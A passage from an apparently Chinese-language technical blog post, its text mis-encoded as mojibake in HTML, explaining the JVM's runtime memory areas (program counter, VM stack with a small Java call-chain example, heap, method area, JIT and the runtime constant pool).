src="http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png" alt="Javaè™šæ‹Ÿæœºè¿è¡Œæ—¶æ•°æ®åŒº"></p><h4 id="ç¨‹åºè®¡æ•°å™¨"><a href="#ç¨‹åºè®¡æ•°å™¨" class="headerlink" title="ç¨‹åºè®¡æ•°å™¨"></a>ç¨‹åºè®¡æ•°å™¨</h4><p>ç¨‹åºè®¡æ•°å™¨å ç”¨äº†æ¯”è¾ƒå°çš„ä¸€å—å†…å­˜ç©ºé—´ï¼Œå¯ä»¥çœ‹ä½œæ˜¯<strong>å½“å‰çº¿ç¨‹</strong>æ‰€æ‰§è¡Œå­—èŠ‚ç çš„è¡Œå·(å­—èŠ‚ç çš„è¡Œå·ï¼Œä¸æ˜¯ä»£ç çš„è¡Œå·ï¼Œå­—èŠ‚ç åº”è¯¥åŒ…å«æœ‰å¯¹åº”ä»£ç è¡Œæ•°çš„ä¿¡æ¯)æŒ‡ç¤ºå™¨ã€‚å­—èŠ‚ç è§£é‡Šå™¨åœ¨å·¥ä½œæ—¶å°±æ˜¯é€šè¿‡æ”¹å˜è¿™ä¸ªè®¡æ•°å™¨çš„å€¼æ¥é€‰å–ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤, å®ƒæ˜¯<strong>ç¨‹åºæ§åˆ¶æµ</strong>çš„æŒ‡ç¤ºå™¨ï¼Œæµç¨‹æ§åˆ¶ï¼Œå¼‚å¸¸å¤„ç†ï¼Œçº¿ç¨‹æ¢å¤éƒ½éœ€è¦ä¾èµ–å®ƒæ¥å®ç°ã€‚</p><p>Javaè™šæ‹Ÿæœºçš„å¤šçº¿ç¨‹æ˜¯é€šè¿‡<strong>çº¿ç¨‹è½®æµåˆ‡æ¢ï¼Œåˆ†é…å¤„ç†å™¨æ—¶é—´</strong>å®ç°çš„ï¼Œå› æ­¤åœ¨ä»»ä½•ä¸€ä¸ªç¡®å®šçš„æ—¶åˆ»ï¼Œä¸€ä¸ªå†…æ ¸éƒ½åªä¼šæ‰§è¡Œä¸€æ¡çº¿ç¨‹ä¸­çš„æŒ‡ä»¤ï¼ˆå³å¹¶å‘æ‰§è¡Œ)ã€‚å› æ­¤ï¼Œä¸ºäº†çº¿ç¨‹åˆ‡æ¢åèƒ½æ¢å¤åˆ°æ­£ç¡®çš„æ‰§è¡Œä½ç½®ï¼Œæ¯æ¡çº¿ç¨‹éƒ½éœ€è¦æœ‰ä¸€ä¸ªç¨‹åºè®¡æ•°å™¨ã€‚å› æ­¤ç¨‹åºè®¡æ•°å™¨æ˜¯<strong>çº¿ç¨‹ç§æœ‰</strong>çš„ã€‚</p><p><strong>â€”è¿™é‡Œç¨å¾®è®²è®²Javaçš„çº¿ç¨‹è°ƒåº¦ &amp; åç¨‹â€”</strong></p><p>è¿™é‡Œå¼•ç”¨ä¸€æ®µåˆ«äººçš„è¯ï¼Œä¸Šé¢æˆ‘å¯èƒ½è¡¨è¿°å¾—ä¸æ˜¯å¾ˆå‡†ç¡®</p><blockquote><p>å› ä¸ºJavaçš„å¤šçº¿ç¨‹ä¹Ÿæ˜¯ä¾é æ—¶é—´ç‰‡è½®è½¬ç®—æ³•è¿›è¡Œçš„ï¼Œå› æ­¤ä¸€ä¸ªCPUåŒä¸€æ—¶é—´ä¹Ÿåªä¼šå¤„ç†ä¸€ä¸ªçº¿ç¨‹ï¼Œå½“æŸä¸ªçº¿ç¨‹çš„æ—¶é—´ç‰‡æ¶ˆè€—å®Œæˆåï¼Œä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªçº¿ç¨‹ç»§ç»­æ‰§è¡Œï¼Œè€Œå½“å‰çº¿ç¨‹çš„æ‰§è¡Œä½ç½®ä¼šè¢«ä¿å­˜åˆ°å½“å‰çº¿ç¨‹çš„ç¨‹åºè®¡æ•°å™¨ä¸­ï¼Œå½“ä¸‹æ¬¡è½®è½¬åˆ°æ­¤çº¿ç¨‹æ—¶ï¼Œåˆç»§ç»­æ ¹æ®ä¹‹å‰çš„æ‰§è¡Œä½ç½®ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p></blockquote><blockquote><p><strong>å•æ ¸</strong>çš„CPUæ˜¯ä¸€ç§å‡çš„å¤šçº¿ç¨‹ï¼Œå› ä¸ºåœ¨ä¸€ä¸ªæ—¶é—´å•å…ƒå†…ï¼Œä¹Ÿåªèƒ½æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹çš„ä»»åŠ¡ã€‚åŒæ—¶é—´æ®µå†…æœ‰å¤šä¸ªçº¿ç¨‹éœ€è¦CPUå»è¿è¡Œæ—¶ï¼ŒCPUä¹Ÿåªèƒ½äº¤æ›¿å»æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ä¸­çš„ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†æ˜¯ç”±äºå…¶æ‰§è¡Œé€Ÿåº¦ç‰¹åˆ«å¿«ï¼Œå› æ­¤æ„Ÿè§‰ä¸å‡ºæ¥ã€‚</p></blockquote><p>æŒ‰ç…§ä¸Šé¢çš„è¯´æ³•ï¼Œæˆ‘ä»¬å‘ç°ï¼Œå…¶å®çº¿ç¨‹å¯ä»¥çœ‹ä½œä¸€ä¸ªä»»åŠ¡ï¼Œ<strong>å†…æ ¸ä¸€ç›´åœ¨å¾ˆå¤šçº¿ç¨‹ä¹‹é—´åå¤æ¨ªè·³</strong>: è¿™ä¸ªåšä¸€ä¼šå„¿å°±åœä¸‹æ¥ï¼Œå»åšä¸‹ä¸€ä¸ªã€‚</p><p>ä½†è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œä½¿ç”¨<code>Thread.sleep(long)</code>åœä¸‹çš„çº¿ç¨‹ï¼Œå†…æ ¸ä¼šæ€ä¹ˆåŠï¼Ÿç­”æ¡ˆæ˜¯ä»ç„¶ä¼šåˆ°ä»–èº«ä¸Šå»ï¼Œä½†ä»€ä¹ˆä¹Ÿä¸åšï¼Œå°±ç™½ç™½æµªè´¹äº†ç»™cpuåˆ†é…çš„æ—¶é—´åˆ†ç‰‡ã€‚è¿™å°±æ˜¯è¿™ç§è®¾è®¡çš„å±€é™æ€§ï¼Œä¸”ä¸è¯´åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹ç›¸å½“å å†…å­˜ï¼Œå³ä¾¿æ˜¯å†…å­˜è¶³å¤Ÿï¼Œå¹¶å‘æ•ˆç‡ä¹Ÿç›¸å½“å·®ï¼ˆå…¶å®è·ŸJavaå½“æ—¶åˆšå‡ºçš„æ—¶å€™çš„å…¶ä»–è¯­è¨€æ¯”èµ·æ¥å·²ç»å¾ˆä¸é”™äº†ï¼‰ã€‚çº¿ç¨‹æ± å½“ç„¶ä¹Ÿä¼šæœ‰è¿™ä¸ªé—®é¢˜ã€‚</p><p>é‚£ä¹ˆç†æƒ³çš„çŠ¶æ€æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘è®©è¿™ä¸ªçº¿ç¨‹ä¼‘çœ äº†ï¼Œä½ cpuå°±ä¸è¦ç®¡ä»–ï¼ŒæŠŠæ—¶é—´åˆ†ç»™å…¶ä»–æœ‰ä»»åŠ¡çš„çº¿ç¨‹ã€‚</p><p>ä¸¤æ¡è·¯ï¼Œè¦ä¹ˆä½ ä»å†…æ ¸å±‚é¢å»æ”¹è‰¯ï¼Œå»æ•™cpuåšäº‹ã€‚å¯¹åº”äº†<code>Thread#yield()</code>,è®©å½“å‰çº¿ç¨‹æŠŠè‡ªå·±çš„æ—¶é—´è®©ç»™å…¶ä»–çº¿ç¨‹ï¼Œå®ç°<strong>æŠ¢å å¼è°ƒåº¦</strong>ã€‚</p><p>å¦å¤–ä¸€æ¡é“è·¯å°±æ˜¯åç¨‹ï¼Œä»ç”¨æˆ·å±‚é¢æ”¹è‰¯ï¼Œcpuæ•™æˆ‘åšäº‹ã€‚</p><blockquote><p>å¦‚æœä½ è§‰å¾—Thread#sleepä¼šæµªè´¹å¹¶å‘æ•ˆç‡ï¼Œé‚£ä½ å°±ä¸è¦ç”¨ï¼ä½ è¦æäº¤èƒ½å……åˆ†åˆ©ç”¨æˆ‘æ•ˆç‡çš„ä»»åŠ¡ï¼Œè€Œä¸æ˜¯ä¸€å‘³çš„è°©éª‚å’ŒæŒ‡è´£ã€‚</p><p>â€‹                                                                                                                                                                                â€”â€” CPU</p></blockquote><p>æ—¢ç„¶<code>Thread.sleep()</code>ä¼šå¯¼è‡´å¹¶å‘æ•ˆç‡ä½ä¸‹ï¼Œé‚£æˆ‘å°±ä¸ç”¨ï¼åœ¨çº¿ç¨‹ä¸‹é¢å†åŒºåˆ†å‡ºæ¥ä¸€ä¸ªåç¨‹çš„æ¦‚å¿µï¼Œåœ¨è¿™é‡ŒæŠŠæ— ç”¨çš„ä»»åŠ¡è¿‡æ»¤ä¸€éï¼Œå†äº¤ç»™çº¿ç¨‹ã€‚è¿™æ ·æ¯ä¸ªå†…æ ¸å¯¹æ¯ä¸ªçº¿ç¨‹çš„åˆ©ç”¨ç‡å°±æé«˜äº†ï¼Œä¹Ÿå¯ä»¥æé«˜å¹¶å‘æ•ˆç‡ã€‚</p><p>æ˜¯ä¸æ˜¯æ„Ÿè§‰javaçš„çº¿ç¨‹ä¹ŸæŒºåƒåç¨‹çš„:)ï¼Œä¹‹å‰è”·ç¥è®²åç¨‹ä¹Ÿè¯´è¿‡çº¿ç¨‹ä¹Ÿå¯ä»¥çœ‹æˆåç¨‹çš„ä¸€ç§å®ç°ã€‚æˆ‘ä¸ªäººè§‰å¾—ä»–ä»¬å”¯ä¸€ä¸åŒçš„åœ°æ–¹å°±åœ¨äºçº¿ç¨‹æ˜¯ç”±å†…æ ¸æ¥è°ƒåº¦ï¼Œå¤„äº<strong>å†…æ ¸æ€</strong>ï¼Œåç¨‹ç”±ç”¨æˆ·ç¼–å†™çš„é€»è¾‘è¿›è¡Œè°ƒåº¦ï¼Œå¤„äº<strong>ç”¨æˆ·æ€</strong>ã€‚åç¨‹å…¶å®æ˜¯å‡å°‘äº†å†…æ ¸çš„<strong>æ— ç”¨çš„</strong>å·¥ä½œé‡ï¼Œæ‰€ä»¥å¹¶å‘ååé‡æ›´å¤§ã€‚</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-161709.jpg"></p><p><strong>â€”ç§è´§ç»“æŸâ€”</strong></p><p>ç¨‹åºè®¡æ•°å™¨æ˜¯JVMå”¯ä¸€ä¸€ä¸ªä¸ä¼šäº§ç”ŸOOMçš„å†…å­˜åŒºåŸŸã€‚</p><blockquote><p>åœ¨æ‰§è¡ŒJavaæ–¹æ³•æ—¶ï¼Œç¨‹åºè®¡æ•°å™¨çš„å€¼ä¸ºæ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€</p><p>åœ¨æ‰§è¡Œæœ¬åœ°æ–¹æ³•æ—¶ï¼Œç¨‹åºè®¡æ•°å™¨çš„å€¼ä¸ºç©º(undefined)</p></blockquote><h4 id="è™šæ‹Ÿæœºæ ˆ"><a href="#è™šæ‹Ÿæœºæ ˆ" class="headerlink" title="è™šæ‹Ÿæœºæ ˆ"></a>è™šæ‹Ÿæœºæ ˆ</h4><p>å…¶å®å¤§å®¶åº”è¯¥éƒ½çŸ¥é“æ‰€è°“å †å’Œæ ˆçš„æ¦‚å¿µå§ã€‚å³ä¾¿Jvmçš„å †å’Œæ ˆä½ æ²¡æœ‰äº†è§£è¿‡ï¼Œåœ¨C/C++è¯¾ä¸Šåº”è¯¥ä¹Ÿäº†è§£è¿‡å †æ ˆçš„æ¦‚å¿µå§ï¼Ÿè™½ç„¶C++è¿™ç§ç›´æ¥ç¼–è¯‘åˆ°nativeçš„è¯­è¨€ä¸­çš„å †å’Œæ ˆä¸Jvmè¯­è¨€ä¸­çš„å †å’Œæ ˆå¹¶ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿â€”â€”JVMæ˜¯virtual machineï¼Œæ˜¯è™šæ‹Ÿæœºï¼Œå®ƒçš„ä¸€åˆ‡ç‰¹æ€§éƒ½æ˜¯è½¯ä»¶æ¨¡æ‹Ÿçš„ã€‚C++ä¸­æˆ‘ä»¬æ‰§è¡Œç¨‹åºç›´æ¥ä½¿ç”¨ç¡¬ä»¶çš„å †æ ˆï¼Œè€ŒJavaæˆ‘ä»¬æ‰§è¡Œç¨‹åºä½¿ç”¨JVMä¸ºæˆ‘ä»¬æ¨¡æ‹Ÿå‡ºæ¥çš„å †æ ˆã€‚</p><p>ä¸ç¨‹åºè®¡æ•°å™¨ä¸€æ ·ï¼Œè™šæ‹Ÿæœºæ ˆä¹Ÿæ˜¯çº¿ç¨‹ç§æœ‰çš„, å®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸çº¿ç¨‹ç›¸åŒï¼Œéšçº¿ç¨‹çš„é‡Šæ”¾è€Œé‡Šæ”¾ã€‚æ¯å½“ä¸€ä¸ªæ–¹æ³•è¢«è°ƒç”¨ï¼Œè™šæ‹Ÿæœºéƒ½ä¼šåŒæ­¥åˆ›å»ºä¸€ä¸ªæ ˆå¸§ç”¨äºå­˜å‚¨<strong>å±€éƒ¨å˜é‡è¡¨ï¼Œæ“ä½œæ•°æ ˆï¼ŒåŠ¨æ€è¿æ¥ï¼Œæ–¹æ³•å‡ºå£</strong>ç­‰ä¿¡æ¯ã€‚æ¯ä¸€ä¸ªæ–¹æ³•ä»è°ƒç”¨åˆ°è¿”å›çš„è¿‡ç¨‹å°±å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹ã€‚</p><p>è¿™é‡Œä»åˆ«äººé‚£é‡ŒæŠ„æ¥äº†ä¸€ä¸ªæµç¨‹å›¾è§£</p><blockquote><p>å¯èƒ½å¬èµ·æ¥æœ‰ç‚¹æ‡µé€¼ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸‹æ•´ä¸ªè™šæ‹Ÿæœºæ ˆçš„è¿ä½œæµç¨‹ï¼Œå…ˆç¼–å†™ä¸€ä¸ªæµ‹è¯•ç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&gt;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>       <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬çš„ä¸»æ–¹æ³•æ‰§è¡Œåï¼Œä¼šä¾æ¬¡æ‰§è¡Œä¸‰ä¸ªæ–¹æ³•<code>a() -&gt; b() -&gt; c() -&gt; è¿”å›</code></p><p>å¯ä»¥çœ‹åˆ°åœ¨ç¼–è¯‘ä¹‹åï¼Œæˆ‘ä»¬æ•´ä¸ªæ–¹æ³•çš„æœ€å¤§æ“ä½œæ•°æ ˆæ·±åº¦ã€å±€éƒ¨å˜é‡è¡¨éƒ½æ˜¯å·²ç»ç¡®å®šå¥½çš„ï¼Œå½“æˆ‘ä»¬ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶ï¼Œä¼šæ ¹æ®è¿™äº›ä¿¡æ¯å°è£…ä¸ºå¯¹åº”çš„æ ˆå¸§ï¼Œæˆ‘ä»¬ä»<code>main</code>æ–¹æ³•å¼€å§‹çœ‹èµ·ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg" alt="image-20220131142625842"></p><p>æ¥ç€æˆ‘ä»¬ç»§ç»­å¾€ä¸‹ï¼Œè°ƒç”¨æ–¹æ³•<code>a()</code>ï¼Œè¿™æ—¶å½“å‰æ–¹æ³•å°±ä¸ä¼šç»§ç»­å‘ä¸‹è¿è¡Œäº†ï¼Œè€Œæ˜¯å»æ‰§è¡Œæ–¹æ³•<code>a()</code>ï¼Œé‚£ä¹ˆåŒæ ·çš„ï¼Œå°†æ­¤æ–¹æ³•ä¹Ÿå…¥æ ˆï¼Œæ³¨æ„æ˜¯æ”¾å…¥åˆ°æ ˆé¡¶ä½ç½®ï¼Œ<code>main</code>æ–¹æ³•çš„æ ˆå¸§ä¼šè¢«å‹ä¸‹å»ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg" alt="image-20220131143641690"></p><p>è¿™æ—¶ï¼Œè¿›å…¥æ–¹æ³•aä¹‹åï¼Œåˆç»§è€Œè¿›å…¥åˆ°æ–¹æ³•bï¼Œæœ€ååœ¨è¿›å…¥cï¼Œå› æ­¤ï¼Œåˆ°è¾¾æ–¹æ³•cçš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„è™šæ‹Ÿæœºæ ˆå˜æˆäº†ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg" alt="image-20220131144209743"></p><p>ç°åœ¨æˆ‘ä»¬ä¾æ¬¡æ‰§è¡Œæ–¹æ³•cä¸­çš„æŒ‡ä»¤ï¼Œæœ€åè¿”å›a+bçš„ç»“æœï¼Œåœ¨æ–¹æ³•cè¿”å›ä¹‹åï¼Œä¹Ÿå°±ä»£è¡¨æ–¹æ³•cå·²ç»æ‰§è¡Œç»“æŸäº†ï¼Œæ ˆå¸§4ä¼šè‡ªåŠ¨å‡ºæ ˆï¼Œè¿™æ—¶æ ˆå¸§3å°±å¾—åˆ°äº†ä¸Šä¸€æ ˆå¸§è¿”å›çš„ç»“æœï¼Œå¹¶ç»§ç»­æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºç´§æ¥ç€é©¬ä¸Šå°±è¿”å›ï¼Œæ‰€ä»¥ç»§ç»­é‡å¤æ ˆå¸§4çš„æ“ä½œï¼Œæ­¤æ—¶æ ˆå¸§3ä¹Ÿå‡ºæ ˆå¹¶ç»§ç»­å°†ç»“æœäº¤ç»™ä¸‹ä¸€ä¸ªæ ˆå¸§2ï¼Œæœ€åæ ˆå¸§2å†å°†ç»“æœè¿”å›ç»™æ ˆå¸§1ï¼Œç„¶åæ ˆå¸§1å°±å¯ä»¥ç»§ç»­å‘ä¸‹è¿è¡Œäº†ï¼Œæœ€åè¾“å‡ºç»“æœã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg" alt="image-20220131144955668"></p></blockquote><p>è™šæ‹Ÿæœºæ ˆå¹¶ä¸æ˜¯æ— é™å¤§çš„ï¼Œå¦‚æœå…¶ä¸­å †ç§¯çš„æ ˆå¸§æ•°é‡å¤ªå¤šå°±ä¼š<strong>çˆ†æ ˆ</strong>(StackOverFlowException)ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>-Xss size</code>çš„vm optionsè®¾ç½®è™šæ‹Ÿæœºçš„æ ˆå¤§å°ã€‚</p><p>å¸¸è§å…³äºè™šæ‹Ÿæœºæ ˆçš„é—®é¢˜:</p><p>åƒåœ¾å›æ”¶æ˜¯å¦æ¶‰åŠæ ˆå†…å­˜ï¼Ÿ</p><ul><li><strong>ä¸æ¶‰åŠ</strong>ï¼Œåƒåœ¾å›æ”¶åªæ¶‰åŠå †å†…å­˜ã€‚åœ¨æ–¹æ³•è¿”å›åå…¶å¯¹åº”çš„æ ˆå¸§å°±ä¼šå‡ºæ ˆï¼Œæ‰€ä»¥ä¸éœ€è¦å›æ”¶å†…å­˜ã€‚</li></ul><p>æ ˆå†…å­˜åˆ†é…å¾—è¶Šå¤§è¶Šå¥½å—?</p><ul><li><strong>ä¸</strong>ï¼Œæ ˆå†…å­˜å¤§äº†ï¼Œå…¶ä»–çš„å†…å­˜åŒºåŸŸå°±å°äº†ã€‚æœ‰æ—¶ä½ å¯¹é€’å½’è°ƒç”¨å¹¶æ²¡æœ‰è¿™ä¹ˆå¤§çš„éœ€æ±‚ï¼Œæ¯•ç«Ÿæ‰€æœ‰çš„é€’å½’è°ƒç”¨éƒ½å¯ä»¥é€šè¿‡å¾ªç¯å®ç°ã€‚</li></ul><h4 id="æœ¬åœ°æ–¹æ³•æ ˆ"><a href="#æœ¬åœ°æ–¹æ³•æ ˆ" class="headerlink" title="æœ¬åœ°æ–¹æ³•æ ˆ"></a>æœ¬åœ°æ–¹æ³•æ ˆ</h4><p>æœ¬åœ°æ–¹æ³•æ ˆå…¶å®è·Ÿè™šæ‹Ÿæœºæ ˆçš„ä½œç”¨éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯ä»–ä»¬ä¸€ä¸ªä¸ºå­—èŠ‚ç å±‚é¢çš„æ–¹æ³•æœåŠ¡ï¼Œä¸€ä¸ªä¸ºæœ¬åœ°æ–¹æ³•æœåŠ¡ã€‚</p><h4 id="Javaå †"><a href="#Javaå †" class="headerlink" title="Javaå †"></a>Javaå †</h4><p>Javaå †æ˜¯è™šæ‹Ÿæœºç®¡ç†çš„å†…å­˜ä¸­æœ€å¤§çš„ä¸€å—, ç”¨æ¥å­˜æ”¾å¯¹è±¡å®ä¾‹ã€‚ä¹Ÿæ˜¯GCçš„ä¸»æˆ˜åœºã€‚ä¸åŒäºä»¥ä¸Šå‡ ä¸ªåŒºåŸŸï¼ŒJavaå †æ˜¯çº¿ç¨‹é—´å…±äº«çš„ã€‚æ‰€ä»¥åœ¨è®¿é—®å †ä¸­å­˜å‚¨çš„æ•°æ®éœ€è¦æ³¨æ„çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p><h4 id="æ–¹æ³•åŒº"><a href="#æ–¹æ³•åŒº" class="headerlink" title="æ–¹æ³•åŒº"></a>æ–¹æ³•åŒº</h4><p>ä¸Javaå †ä¸€æ ·æ˜¯çº¿ç¨‹é—´å…±äº«çš„åŒºåŸŸï¼Œå®ƒä¸»è¦ç”¨äºå­˜å‚¨å·²ç»è¢«è™šæ‹ŸæœºåŠ è½½çš„<strong>ç±»å‹ä¿¡æ¯ï¼Œå¸¸é‡ï¼Œé™æ€å˜é‡ï¼Œå³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç¼“å­˜</strong>ã€‚è™½ç„¶ã€ŠJavaè™šæ‹Ÿæœºè§„èŒƒã€‹ä¸­æŠŠæ–¹æ³•åŒºæè¿°ä¸ºå †çš„ä¸€ä¸ªé€»è¾‘éƒ¨åˆ†ï¼Œä½†å®ƒå´æœ‰ä¸€ä¸ªåˆ«åå«åšâ€œéå †â€(Non-Heap)ï¼Œç›®çš„æ˜¯ä¸Javaå †åŒºåˆ†å¼€æ¥ã€‚</p><p>ä½ å¯èƒ½ä¼šå¬è¯´æ–¹æ³•åŒºå°±æ˜¯å †çš„æ°¸ä¹…ä»£è¿™ä¸ªè¯´æ³•ï¼Œå®é™…ä¸æ˜¯è¿™æ ·çš„ã€‚ä»…ä»…åªæ˜¯å› ä¸ºHotSpot VMé€‰æ‹©ä½¿ç”¨æ°¸ä¹…ä»£æ¥å®ç°æ–¹æ³•åŒºï¼Œä½†å®é™…ä¸Šè¿™æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„æ¦‚å¿µã€‚</p><blockquote><p>å¯èƒ½çœ‹èµ·æ¥æœ‰ç‚¹çªå…€ï¼Œåªæ˜¯å†™åˆ°è¿™é‡Œçš„æ—¶å€™çªç„¶æƒ³è¯´ä¸€ä¸‹JITï¼ˆå³æ—¶ç¼–è¯‘å™¨ï¼‰çš„å·¥ä½œæµç¨‹</p><p>è¿™é‡Œå¯ä»¥å‘ç°å…¶å®jvmå¹¶éå•çº¯è§£é‡Šæ‰§è¡Œå­—èŠ‚ç ï¼Œè€Œæ˜¯åœ¨è§£é‡Šé‡è¾¾åˆ°ä¸€å®šé˜ˆå€¼åè§¦å‘å³æ—¶ç¼–è¯‘ï¼Œå°†ç¼–è¯‘åçš„å­—èŠ‚ç ç¼“å­˜åˆ°æ–¹æ³•åŒºï¼Œä¸‹æ¬¡è°ƒç”¨æ—¶ä¾¿å¯ä»¥ç›´æ¥æ‰§è¡Œç¼–è¯‘åçš„æœºå™¨ç ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´å¸¸ç”¨çš„æ–¹æ³•ä¼šè¢«ç¼“å­˜ä¸ºæœºå™¨ç ï¼‰</p><p><img src="https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg" alt="img"></p></blockquote><p><strong>è¿è¡Œæ—¶å¸¸é‡æ± </strong></p><p>è¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ã€‚åœ¨ç±»åŠ è½½æ—¶JVMè¯»å–classæ–‡ä»¶ä¸­å¸¸é‡æ± è¡¨çš„ä¿¡æ¯ï¼Œå¹¶æŠŠå®ƒå­˜å…¥è¿è¡Œæ—¶å¸¸é‡æ± ã€‚è‡³äºå¸¸é‡æ± è¡¨ï¼Œä¸‹é¢æˆ‘ä»¬è®²å­—èŠ‚ç çš„æ—¶å€™å†è¯¦ç»†ä»‹ç»ï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦çŸ¥é“å®ƒæ˜¯å­˜æ”¾ç¨‹åºè¿è¡Œæ‰€éœ€çš„å¸¸é‡å³å¯ã€‚</p><p>è€Œè¿è¡Œæ—¶å¸¸é‡æ± çš„å¦å¤–ä¸€ä¸ªé‡è¦ç‰¹å¾å°±æ˜¯å…·å¤‡<strong>åŠ¨æ€æ€§</strong>ï¼ŒJavaå¹¶ä¸è¦æ±‚å¸¸é‡ä¸€å®šåªæœ‰åœ¨ç¼–è¯‘æœŸæ‰èƒ½äº§ç”Ÿï¼Œè¿™ç‚¹ä¸c++ä¸åŒï¼Œè¿è¡ŒæœŸé—´ä¹Ÿå¯ä»¥æœ‰æ–°çš„å¸¸é‡è¿›å…¥å¸¸é‡æ± ã€‚è¿™ç§ç‰¹æ€§è¢«å¼€å‘äººå‘˜åˆ©ç”¨å¾—æ¯”è¾ƒå¤šçš„å°±æ˜¯<code>String#intern()</code>æ–¹æ³•ã€‚</p><blockquote><p>å…³äºString#internæ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨åŒå¼•å·å£°æ˜çš„å­—ç¬¦ä¸²éƒ½ä¼šç›´æ¥å­˜å‚¨åœ¨å¸¸é‡æ± ä¸­</p><p>è€Œéé€šè¿‡åŒå¼•å·å£°æ˜å‡ºæ¥çš„å­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨String#internæ–¹æ³•æŸ¥è¯¢å¸¸é‡æ± ä¸­æ˜¯å¦å­˜åœ¨è¯¥å­—ç¬¦ä¸²ï¼Œè‹¥ä¸å­˜åœ¨å°±ä¼šå°†å…¶æ”¾å…¥å¸¸é‡æ± </p><p>æ˜¯ä¸æ˜¯åˆå¯ä»¥ç†è§£javaçš„å­—ç¬¦ä¸²å¯¹è±¡ä¸ºä»€ä¹ˆä¸å¯å˜äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸€èˆ¬è·å–çš„å­—ç¬¦ä¸²éƒ½ä¼šå­˜å‚¨åœ¨å¸¸é‡æ± ä¸­ï¼Œå¦‚æœç›´æ¥å¯¹å­—ç¬¦ä¸²å¯¹è±¡åŠ¨åˆ€å²‚ä¸æ˜¯æ²¡æœ‰æ„ä¹‰äº†</p><p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸æ¨èç›´æ¥é€šè¿‡Stringçš„æ„é€ æ–¹æ³•è·å¾—ä¸€ä¸ªStringå¯¹è±¡çš„åŸå› ï¼Œå› ä¸ºè¿™æ 